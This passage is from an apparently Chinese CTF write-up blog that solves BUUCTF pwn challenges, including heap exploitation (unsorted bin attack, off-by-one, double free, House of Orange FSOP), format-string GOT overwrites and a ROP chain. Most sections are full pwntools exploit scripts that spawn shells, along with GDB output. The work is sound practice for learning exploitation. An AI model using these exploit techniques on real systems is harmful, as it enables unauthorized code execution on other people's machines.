context.log_level = &quot;debug&quot;
elf = ELF(&quot;./magicheap&quot;)
libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)
p = process(&quot;./magicheap&quot;)
#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)

def add(sz,text):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)

def edit(idx,text):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(len(text)))
	p.sendlineafter(&quot;:&quot;,str(text))

def free(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

l33t = 0x6020A0
if __name__ == '__main__':
	add(0x60,'aaaa')
	add(0x60,'aaaa')
	add(0x60,'aaaa')

	free(2)
	edit(1,'a'*0x60+p64(0)+p64(0x71)+p64(l33t-0x13)) #&lt;--控制bk指针

	add(0x60,'aaaa') #2
	add(0x60,'aaaa') #3 fake_chunk
	edit(3,'a'*8)
	p.sendlineafter(&quot;:&quot;,str(0x1305))
	p.interactive()
</code></pre>
<blockquote>
<p>为什么是p64(l33t-0x13)？</p>
<blockquote>
<p>经过动态调试得该处是unsorted bin链表</p>
</blockquote>
<p>为什么edit(3,'a'*8)？</p>
<blockquote>
<p>覆写magic的值为‘0x6161616161616161从而进入后门</p>
</blockquote>
</blockquote>
<h2>hitcontraining_heapcreator</h2>
<p><strong>Off_By_One</strong></p>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<pre><code class="language-asp">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<p>日常增删查改</p>
<pre><code class="language-python">def add(size,content):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(size))
	p.sendlineafter(&quot;:&quot;,content)
</code></pre>
<pre><code class="language-python">def edit(idx,content):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,content)
</code></pre>
<pre><code class="language-python">def show(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<pre><code class="language-python">def delete(idx):
	p.sendlineaftr(&quot;:&quot;,&quot;4&quot;)
	p.sendline(&quot;:&quot;,str(idx))
</code></pre>
<p><strong>edit</strong></p>
<pre><code class="language-c">printf(&quot;Content of heap : &quot;, &amp;buf);
    read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
    puts(&quot;Done !&quot;);
</code></pre>
<blockquote>
<p>人为的多读取了一个字节(off by one使得我们可以控制下一个<code>chunk</code>的<code>size</code>,再得到`libc base 最后改free为system</p>
</blockquote>
<ul>
<li><strong>3.EXP</strong></li>
</ul>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./heapcreator&quot;)
libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
#p = process(&quot;./heapcreator&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,29082)

def add(size,content):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(size))
	p.sendlineafter(&quot;:&quot;,content)

def edit(idx,content):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,content)

def show(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

def delete(idx):
	p.sendlineaftr(&quot;:&quot;,&quot;4&quot;)
	p.sendline(&quot;:&quot;,str(idx))

if __name__ == '__main__':
	add(0x18,'aaaa')
	add(0x18,'aaaa')
	#gdb.attach(p)
	edit(0,'/bin/sh\x00'+'a'*0x10+'\x41') #&lt;-off by one
	#gdb.attach(p)
	delete(1)
	#gdb.attach(p)
	add(0x30,p64(0)*4+p64(0x30)+p64(elf.got[&quot;free&quot;]))
	#gdb.attach(p)
	show(1)

	leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base=leak-libc.sym[&quot;free&quot;]
	sys_addr = base+libc.sym[&quot;system&quot;]

	log.success(&quot;leak addr=&gt;0x%x&quot;,leak)
	log.success(&quot;libc base=&gt;0x%x&quot;,base)
	log.success(&quot;system addr=&gt;0x%x&quot;,sys_addr)

	edit(1,p64(sys_addr))
	delete(0)
	p.interactive()
</code></pre>
<h2>hitcontraining_secret_garden</h2>
<p><strong>Double_Free</strong></p>
<ul>
<li><strong>1.checksec</strong></li>
</ul>
<pre><code class="language-asp">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<ul>
<li><strong>2.IDA</strong></li>
</ul>
<p>原来的菜单有很多无用的函有用的就两个</p>
<pre><code class="language-python">def create(lenght,name,color):
    p.sendlineafter(&quot;:&quot;,'1')
    p.sendlineafter(&quot;:&quot;,str(lenght))
    p.sendlineafter(&quot;:&quot;,name)
    p.sendlineafter(&quot;:&quot;,color)
</code></pre>
<pre><code class="language-python">def delete(idx):
    p.sendlineafter(&quot;:&quot;,'3')
    p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<p><strong>back_door</strong></p>
<pre><code class="language-c">int magic()
{
  return system(&quot;/bin/sh&quot;);
}
</code></pre>
<ul>
<li><strong>3.EXP</strong></li>
</ul>
<p>原版EXP</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = &quot;training.pwnable.tw&quot;
port = 11012

#r = remote(host,port)
r = process(&quot;./secretgarden&quot;)

def raiseflower(length,name,color):
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;1&quot;)
    r.recvuntil(&quot;:&quot;)
    r.sendline(str(length))
    r.recvuntil(&quot;:&quot;)
    r.sendline(name)
    r.recvuntil(&quot;:&quot;)
    r.sendline(color)

def visit():
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;2&quot;)

def remove(idx):
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;:&quot;)
    r.sendline(str(idx))

def clean():
    r.recvuntil(&quot;:&quot;)
    r.sendline(&quot;4&quot;)

magic = 0x400c7b
fake_chunk = 0x601ffa
raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
remove(0)
remove(1)
remove(0)
raiseflower(0x50,p64(fake_chunk),&quot;blue&quot;)
raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)
raiseflower(0x50,&quot;a&quot;*6 + p64(0) + p64(magic)*2 ,&quot;red&quot;)

r.interactive()
</code></pre>
<h2>houseoforange_hitcon_2016</h2>
<h3>checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
</code></pre>
<blockquote>
<p>保护全开</p>
</blockquote>
<h3>IDA</h3>
<pre><code class="language-c">  puts(&quot; 1. Build the house                  &quot;);
  puts(&quot; 2. See the house                    &quot;);
  puts(&quot; 3. Upgrade the house                &quot;);
</code></pre>
<blockquote>
<p>没有 <strong>free</strong> 相关函数</p>
</blockquote>
<h4>build</h4>
<pre><code class="language-c">if ( unk_203070 &gt; 3u )
  {
    puts(&quot;Too many house&quot;);
    exit(1);
  }
</code></pre>
<blockquote>
<p>最多只能有3个橘子</p>
</blockquote>
<pre><code class="language-c">  v3 = malloc(0x10uLL);                         // 存储house大小
  printf(&quot;Length of name :&quot;);
  size = made_choice();
  if ( size &gt; 0x1000 )
    size = 0x1000;
  v3[1] = malloc(size);
  if ( !v3[1] )
  {
    puts(&quot;Malloc error !!!&quot;);
    exit(1);
  }
</code></pre>
<blockquote>
<p>最多可以申请 0x1000大小的chunk</p>
</blockquote>
<pre><code class="language-c">printf(&quot;Color of Orange:&quot;);
  size_4 = made_choice();
  if ( size_4 != 0xDDAA &amp;&amp; (size_4 &lt;= 0 || size_4 &gt; 7) )
  {
    puts(&quot;No such color&quot;);
    exit(1);
  }
  if ( size_4 == 0xDDAA )
    v4[1] = 0xDDAA;
  else
    v4[1] = size_4 + 30;
  *(_QWORD *)v3 = v4;
  house_idx = v3;
  ++unk_203070;
  return puts(&quot;Finish&quot;);
}
</code></pre>
<blockquote>
<p>发现 <strong>color</strong> 可以变为（1&lt;x&lt;=7）|| x=0xDDAA，这里可能是突破口</p>
</blockquote>
<h4>upgrade</h4>
<pre><code class="language-c">if ( unk_203074 &gt; 2u )
    return puts(&quot;You can't upgrade more&quot;);
</code></pre>
<blockquote>
<p>只能使用两次</p>
</blockquote>
<pre><code class="language-c">  printf(&quot;Length of name :&quot;);
  v2 = made_choice();
  if ( v2 &gt; 0x1000 )
    v2 = 0x1000;
  printf(&quot;Name:&quot;);
  safe_read((void *)house_name[1], v2);
  printf(&quot;Price of Orange: &quot;, v2);
  v1 = (_DWORD *)*house_name;
  *v1 = made_choice();
  colorful();  
  printf(&quot;Color of Orange: &quot;);
  v3 = made_choice();
  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )
  {
    puts(&quot;No such color&quot;);
    exit(1);
  }
  if ( v3 == 0xDDAA )
    *(_DWORD *)(*house_name + 4LL) = 0xDDAA;
  else
    *(_DWORD *)(*house_name + 4LL) = v3 + 30;
  ++unk_203074;
  return puts(&quot;Finish&quot;);
</code></pre>
<blockquote>
<p>同样可以申请 0x1000大小的chunk之类的操作，可以堆溢出</p>
</blockquote>
<h3>思路</h3>
<p>1.修改top_chunk的size</p>
<p>2.触发sysmalloc中的_int_free</p>
<p>3.泄露libc和heap的地址</p>
<p>4.触发异常</p>
<h3>gdb</h3>
<h4>0x1 修改top_chunk的size</h4>
<p>申请一个house，结构为</p>
<pre><code class="language-python">#code
add(0x30,'a'*8)
#gdb
gef➤  x/32gx 0x556593871000
0x556593871000:	0x0000000000000000	0x0000000000000021
0x556593871010:	0x0000556593871070	0x0000556593871030
0x556593871020:	0x0000000000000000	0x0000000000000041
0x556593871030:	0x0000000a61616161	0x0000000000000000
0x556593871040:	0x0000000000000000	0x0000000000000000
0x556593871050:	0x0000000000000000	0x0000000000000000
0x556593871060:	0x0000000000000000	0x0000000000000021
0x556593871070:	0x000000210000000a	0x0000000000000000
0x556593871080:	0x0000000000000000	0x0000000000020f81
。。。。。。。。  。。。。。。。。。。。 。。。。。。。。。。
</code></pre>
<p>覆盖掉 <strong>top chunk</strong> size域的payload为</p>
<p><code>payload = 'a'*0x30+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xf81)</code></p>
<p>这样就将 <strong>top_chunk-&gt;szie = 0x1fc0</strong></p>
<pre><code>0x56222cc84000:	0x0000000000000000	0x0000000000000021
0x56222cc84010:	0x000056222cc84070	0x000056222cc84030
0x56222cc84020:	0x0000000000000000	0x0000000000000041
0x56222cc84030:	0x6161616161616161	0x6161616161616161
..............  ..................  ..................
0x56222cc84060:	0x0000000000000000	0x0000000000000021
0x56222cc84070:	0x0000002100000006	0x6161616161616161
0x56222cc84080:	0x0000000000000000	0x0000000000000f81
0x56222cc84090:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>修改成功</p>
<h4>0x2 触发sysmalloc中的_int_free</h4>
<p>成功修改 <strong>top chunk</strong>,下一步只要我们申请一块 topchunk <strong>大小不满足</strong>的chunk即可，由之前的分析可知我们最大可以申请 <strong>0x1000</strong> 的空间，那么</p>
<p><code>add(0x1000,'b'*8)</code></p>
<pre><code>Chunk(addr=0x564081bf1010, size=0x20, flags=PREV_INUSE)
Chunk(addr=0x564081bf1030, size=0x40, flags=PREV_INUSE)
Chunk(addr=0x564081bf1070, size=0x20, flags=PREV_INUSE)
Chunk(addr=0x564081bf1090, size=0x20, flags=PREV_INUSE)
Chunk(addr=0x564081bf10b0, size=0x20, flags=PREV_INUSE)
Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)
Chunk(addr=0x564081bf1ff0, size=0x10, flags=)
Chunk(addr=0x564081bf2000, size=0x10, flags=PREV_INUSE)
</code></pre>
<p><strong>top_chunk</strong>消失了</p>
<pre><code>[+] unsorted_bins[0]: fw=0x564081bf10c0, bk=0x564081bf10c0
 →   Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
</code></pre>
<p>成功加入 <strong>unsroted bins</strong> ,相当于 <strong>free</strong> 掉了top chunk</p>
<h4>0x3 泄露libc和heap的地址</h4>
<p>下从 <strong>unsorted bins</strong> 中取出一点下来用</p>
<p>因为原来有输出的功能，那么我们使用它输出刚才的那个chunk</p>
<pre><code class="language-python">#code:
	add(0x400,'c'*8)
	see()
	leak = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	log.success(&quot;leak add =&gt; 0x%x&quot;,leak)
	gdb.attach(p)
#输出
[+] leak add =&gt; 0x7f5cf839a10a
#gdb
0x5584c45e30e0 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0x6363636363636363, 
  bk = 0x7f5cf839a10a &lt;main_arena+1514&gt;, 
  fd_nextsize = 0x5584c45e30e0, 
  bk_nextsize = 0x5584c45e30e0
}
vmmap
   0x5584c45e3000     0x5584c4626000 rw-p    43000 0      [heap]
    0x7f5cf7fd5000     0x7f5cf8195000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5cf8195000     0x7f5cf8395000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5cf8395000     0x7f5cf8399000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f5cf8399000     0x7f5cf839b000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
</code></pre>
<p>如果知道是知道libc2.23的话</p>
<pre><code>&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000-1514)
'0x3c4b20'
</code></pre>
<p>不知道的话直接加减</p>
<pre><code>&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000)
'0x3c510a'
</code></pre>
<p>同理可知 heap_base</p>
<p>开始泄露，但是要泄露什么？这里泄露的东西就决定了我们攻击的方式</p>
<p>这道题保护全开，之前的方法好像不太行，想起之前的文章<a href="http://www.joe1sn.top/2020/04/22/io_file/">FILE结构</a></p>
<p>那我们可以伪造出一个file，通过修改 <strong>vtable</strong> 指针来调用 <strong>system</strong>那么就需要</p>
<pre><code class="language-python">	libc_base = leak-0x3c510a
	system_addr = libc_base+libc.sym[&quot;system&quot;]
	binsh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
	IO_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;]
	IO_str_jumps = libc.symbols[&quot;_IO_file_jumps&quot;]+0xc0+libc_base
</code></pre>
<h4>0x4 开始构造 fake file</h4>
<blockquote>
<blockquote>
<p>ptr_vtable指向伪造的vtable处，vtable[3]为IO_overflow函数地址，将vtable[3]伪造为system地址，</p>
</blockquote>
<blockquote>
<p>如果再进入build_house函数，进行malloc(0x10)，由于0x10&lt;=2*SIZE_SZ，就会触发malloc_printerr，会遍历IO_llist_all，通过chain找到最终伪造的在old top chunk处的_IO_FILE，然后找到vtable，最终调用 IO_overflow函数</p>
</blockquote>
<blockquote>
<p>调用IO_overflow时会传入_IO_FILE结构指针作为参数，将old top chunk处伪造的_IO_FILE的前几个字节修改为/bin/sh\x00 即最终调用为system('/bin/sh')</p>
</blockquote>
<p><a href="https://blog.csdn.net/aaa15893831716/article/details/102408187">2016 ctf-HITCON——houseoforange</a></p>
</blockquote>
<p>FILE结构</p>
<pre><code class="language-c">struct _IO_FILE
{
  int _flags;		/* 高阶版本也叫作 _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
    //read
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
    //write
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;//通过这个域创造链表

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
</code></pre>
<p>偏移0x20处为IO_write_base,偏移0x28处为IO_write_ptr,偏移0xc8处为_mode,偏移0xd8处为ptr_vtable</p>
<p>绕过检测：</p>
<pre><code>1._mode&lt;=0

2._IO_write_base&lt;IO_write_ptr
</code></pre>
<p>最终的结构体</p>
<pre><code class="language-python">	payload = &quot;a&quot;*0x400
	payload += p64(0)+p64(0x21)+'a'*0x10

	fake_file =	p64(0)+p64(0x60)

	#利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58(即&amp;unsorted_bin+0x10)
	fake_file += p64(0)+p64(IO_list_all-0x10)
	fake_file += p64(0)+p64(1)
	fake_file += p64(0)+p64(binsh)

	fake_file = fake_file.ljust(0xc0,'\x00')
	payload += fake_file
	payload += p64(0)*3
	payload += p64(IO_str_jumps-0x8)
	payload += p64(0)
	payload += p64(system_addr)	#jump2here
</code></pre>
<pre><code>unsortedbin
all [corrupted]
FD: 0x55b6afcad510 ◂— 0x0
BK: 0x55b6afcad510 —▸ 0x7f0850d77510 ◂— 0x0
pwndbg&gt; x/12gx 0x7f0850d77510
0x7f0850d77510:	0x0000000000000000	0x0000000000000000
0x7f0850d77520 &lt;_IO_list_all&gt;:	0x00007f0850d77540	0x0000000000000000
0x7f0850d77530:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>已经迁移IO_list_all</p>
<h3>EXP</h3>
<pre><code class="language-python"># -*- coding: utf-8 -*- 
from pwn import *
#context.log_level =&quot;debug&quot;
elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)
libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)
p = 0

def connect(ip,port,mode):
	global p
	if mode == 1:
		p = process(&quot;./houseoforange_hitcon_2016&quot;)
	else:
		p = remote(ip,port)

def add(sz,name):
	p.sendlineafter(&quot;: &quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,name)
	p.sendlineafter(&quot;:&quot;,&quot;10&quot;)
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)

def see():
	p.sendlineafter(&quot;: &quot;,&quot;2&quot;)

def edit(sz,text):
	p.sendlineafter(&quot;: &quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)

def pwn():
#------------House_of_orange------------
	add(0x30,'a'*8)
	payload = 'a'*0x30+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xf81)
	edit(len(payload),payload)

	add(0x1000,'b')
	add(0x400,'c'*8)
	see()
	leak = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	log.success(&quot;leak add =&gt; 0x%x&quot;,leak)

#------------Unsoted_bin leak------------
	libc_base = leak-0x3c510a
	system_addr = libc_base+libc.sym[&quot;system&quot;]
	binsh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
	IO_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;]
	IO_str_jumps = libc.symbols[&quot;_IO_file_jumps&quot;]+0xc0+libc_base

	log.success(&quot;libc base =&gt; 0x%x&quot;,libc_base)
	log.success(&quot;system addr =&gt; 0x%x&quot;,system_addr)
	log.success(&quot;IO list all =&gt; 0x%x&quot;,IO_list_all)
	log.success(&quot;IO str jump =&gt; 0x%x&quot;,IO_str_jumps)

#------------Fake FILE------------
	payload = &quot;a&quot;*0x400
	payload += p64(0)+p64(0x21)+'a'*0x10

	fake_file =	p64(0)+p64(0x60)

	#利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58(即&amp;unsorted_bin+0x10)
	fake_file += p64(0)+p64(IO_list_all-0x10)
	fake_file += p64(0)+p64(1)
	fake_file += p64(0)+p64(binsh)

	fake_file = fake_file.ljust(0xc0,'\x00')
	payload += fake_file
	payload += p64(0)*3
	payload += p64(IO_str_jumps-0x8)
	payload += p64(0)
	payload += p64(system_addr)	#jump2here
	edit(0x800,payload)
	p.recv()
	p.sendline(&quot;1&quot;)
	p.sendline(&quot;1&quot;)
	p.interactive()

if __name__ == '__main__':
	connect(&quot;node3.buuoj.cn&quot;,29891,1)
	pwn()
</code></pre>
<h2>inndy_echo</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-10Ch]
  unsigned int v4; // [esp+10Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  do
  {
    fgets(&amp;s, 0x100, stdin);
    printf(&amp;s);
  }
  while ( strcmp(&amp;s, &quot;exit\n&quot;) );
  system(&quot;echo Goodbye&quot;);
  exit(0);
}
</code></pre>
<blockquote>
<p>字符串格式化漏洞，没有栈溢出，利用任意地址写把<code>printf@got</code>改为<code>system@plt</code></p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./echo&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,&quot;29921&quot;)

printf_got_addr = elf.got[&quot;printf&quot;]
system_plt_addr = elf.plt[&quot;system&quot;]

payload = fmtstr_payload(7,{printf_got_addr: system_plt_addr})
p.sendline(payload)
p.sendline(&quot;$0&quot;)

p.interactive()
</code></pre>
<h2>inndy_rop</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>overflow</strong></p>
<pre><code class="language-c">int overflow()
{
  char v1; // [esp+Ch] [ebp-Ch]

  return gets(&amp;v1);
}
</code></pre>
<blockquote>
<p>函数复杂，有溢出，直接自动生成ropchain</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
from struct import pack
context.log_level = &quot;debug&quot;
#q = process('./rop')
q = remote(&quot;node3.buuoj.cn&quot;,&quot;28171&quot;)
context.log_level = 'debug'

def payload():
    p = 'a'*0xc + 'bbbb'
    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
    p += pack('&lt;I', 0x080ea060) # @ .data
    p += pack('&lt;I', 0x080b8016) # pop eax ; ret
    p += '/bin'
    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret
    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
    p += pack('&lt;I', 0x080ea064) # @ .data + 4
    p += pack('&lt;I', 0x080b8016) # pop eax ; ret
    p += '//sh'
    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret
    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
    p += pack('&lt;I', 0x080ea068) # @ .data + 8
    p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret
    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret
    p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
    p += pack('&lt;I', 0x080ea060) # @ .data
    p += pack('&lt;I', 0x080de769) # pop ecx ; ret
    p += pack('&lt;I', 0x080ea068) # @ .data + 8
    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
    p += pack('&lt;I', 0x080ea068) # @ .data + 8
    p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
    p += pack('&lt;I', 0x0806c943) # int 0x80
    return p
shell = payload()
q.sendline(shell)
q.interactive()
</code></pre>
<h2>jarvisoj_fm</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+2Ch] [ebp-5Ch]
  unsigned int v5; // [esp+7Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  be_nice_to_people();
  memset(&amp;buf, 0, 0x50u);
  read(0, &amp;buf, 0x50u);
  printf(&amp;buf);
  printf(&quot;%d!\n&quot;, x);
  if ( x == 4 )
  {
    puts(&quot;running sh...&quot;);
    system(&quot;/bin/sh&quot;);
  }
  return 0;
}
</code></pre>
<blockquote>
<p>利用字符串格式化漏洞改<code>x</code>为<code>4</code></p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
#p = remote(&quot;node3.buuoj.cn&quot;,26472)
p = process(&quot;./fm&quot;)
elf = ELF(&quot;./fm&quot;)
x_addr = 0x0804A02C
payload = p32(x_addr)+&quot;%11$n&quot;
p.sendline(payload)
p.interactive()
</code></pre>
<h2>jarvisoj_guess</h2>
<p><a href="https://blog.csdn.net/pashanhu6402/article/details/96428887">Socket原理讲解</a></p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/106694793">下标越界导致盲注</a></p>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>is_flag_correct</strong></p>
<pre><code class="language-c">  qmemcpy(bin_by_hex, &amp;unk_401100, sizeof(bin_by_hex));
  qmemcpy(flag, &quot;FAKE{9b355e394d2070ebd0df195d8b234509cc29272bc412}&quot;, sizeof(flag));
  bzero(given_flag, 0x32uLL);  
for ( i = 0; i &lt;= 0x31; ++i )
  {
    value1 = bin_by_hex[flag_hex[2 * i]];
    value2 = bin_by_hex[flag_hex[2 * i + 1]];
    if ( value1 == -1 || value2 == -1 )
    {
      puts(&quot;bad input – one of the characters you supplied was not a valid hex character!&quot;);
      exit(0);
    }
    given_flag[i] = value2 | 16 * value1;
  }
  diff = 0;
  for ( i_0 = 0; i_0 &lt;= 49; ++i_0 )
    diff |= flag[i_0] ^ given_flag[i_0];
  return diff == 0;
</code></pre>
<p>其中 <strong>flag</strong> 是之前 <code>qmemcpy</code>过后的，<strong>given_flag</strong>是通过 <strong>value_1</strong> 和 <strong>value_2</strong> 的值计算来的，而这两个值是由我们输入的flag决定，如果控制 <strong>flag_hex[2 * i]</strong> 为负数，就可以flag结果修改为正确的flag结果，这样就可以通过后面的检测了</p>
<p><strong>is_flag_correct -&gt; stack</strong></p>
<pre><code>-00000000000001A0
-00000000000001A0                 db ? ; undefined
-000000000000019F                 db ? ; undefined
-000000000000019E                 db ? ; undefined
-000000000000019D                 db ? ; undefined
-000000000000019C                 db ? ; undefined
-000000000000019B                 db ? ; undefined
-000000000000019A                 db ? ; undefined
-0000000000000199                 db ? ; undefined
-0000000000000198 flag_hex        dq ?                    ; offset
-0000000000000190 given_flag      db 50 dup(?)
-000000000000015E                 db ? ; undefined
-000000000000015D                 db ? ; undefined
-000000000000015C                 db ? ; undefined
-000000000000015B                 db ? ; undefined
-000000000000015A                 db ? ; undefined
-0000000000000159                 db ? ; undefined
-0000000000000158                 db ? ; undefined
-0000000000000157                 db ? ; undefined
-0000000000000156                 db ? ; undefined
-0000000000000155                 db ? ; undefined
-0000000000000154                 db ? ; undefined
-0000000000000153                 db ? ; undefined
-0000000000000152                 db ? ; undefined
-0000000000000151                 db ? ; undefined
-0000000000000150 flag            db 50 dup(?)
-000000000000011E                 db ? ; undefined
-000000000000011D                 db ? ; undefined
-000000000000011C                 db ? ; undefined
-000000000000011B                 db ? ; undefined
-000000000000011A                 db ? ; undefined
